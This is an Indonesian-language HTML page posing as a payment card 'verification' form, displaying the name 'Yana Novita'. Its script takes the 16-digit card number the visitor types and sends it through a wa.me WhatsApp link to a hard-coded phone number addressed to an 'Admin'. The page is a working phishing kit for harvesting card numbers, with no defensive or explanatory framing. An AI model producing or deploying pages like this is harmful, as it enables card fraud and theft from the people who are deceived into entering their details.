<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kartu Verifikasi</title>

<style>
*{
  box-sizing:border-box;
  font-family:'Segoe UI', Arial, sans-serif;
}
body{
  margin:0;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:linear-gradient(135deg,#0f0f0f,#1a1a1a);
}
.nama{
  position:absolute;
  top:40px;
  font-size:22px;
  font-weight:800;
  letter-spacing:1px;
  color:#ffc107;
  text-shadow:0 0 15px rgba(255,193,7,.6);
}
.card{
  width:100%;
  max-width:420px;
  background:#141414;
  border-radius:26px;
  padding:34px 28px;
  border:2px solid rgba(255,193,7,.45);
  box-shadow:0 0 45px rgba(255,193,7,.35);
  text-align:center;
}
.card-icon{
  width:90px;
  height:90px;
  border-radius:50%;
  background:linear-gradient(135deg,#ffc107,#ff9800);
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:40px;
  color:#111;
  margin:0 auto 20px;
  box-shadow:0 0 25px rgba(255,193,7,.7);
}
h2{
  margin:0 0 10px;
  font-size:24px;
  font-weight:900;
  letter-spacing:1.2px;
  color:#ffc107;
}
p{
  font-size:14px;
  color:#ccc;
  margin-bottom:26px;
}
input{
  width:100%;
  padding:15px;
  border-radius:18px;
  border:1px solid rgba(255,193,7,.45);
  background:#0f0f0f;
  color:#fff;
  font-size:16px;
  outline:none;
  margin-bottom:22px;
  text-align:center;
  letter-spacing:2px;
  font-weight:600;
}
button{
  width:100%;
  padding:16px;
  border:none;
  border-radius:20px;
  font-size:17px;
  font-weight:800;
  letter-spacing:1px;
  background:linear-gradient(135deg,#ffc107,#ff9800);
  color:#111;
  cursor:pointer;
  transition:.25s;
}
button:hover{
  transform:scale(1.04);
  box-shadow:0 0 22px rgba(255,193,7,.8);
}
</style>
</head>

<body>

<div class="nama">Yana Novita</div>

<div class="card">
  <div class="card-icon">ðŸ’³</div>
  <h2>VERIFIKASI KARTU</h2>
  <p>Masukkan nomor kartu Anda untuk melanjutkan</p>

  <input type="text" id="kartu" placeholder="NOMOR KARTU" maxlength="16">

  <button onclick="bukaWA()">LANJUTKAN</button>
</div>

<script>
function bukaWA(){
  var nomorWA = "6283155620630";
  var nomorKartu = document.getElementById("kartu").value;

  if(nomorKartu.trim() === ""){
    alert("Silakan masukkan nomor kartu terlebih dahulu");
    return;
  }

  var pesan =
    "Halo Admin,%0A" +
    "Saya ingin melanjutkan verifikasi.%0A%0A" +
    "Nomor Kartu:%20" + nomorKartu;

  var url = "https://wa.me/" + nomorWA + "?text=" + pesan;

  window.open(url, "_blank");
}
</script>

</body>
</html>
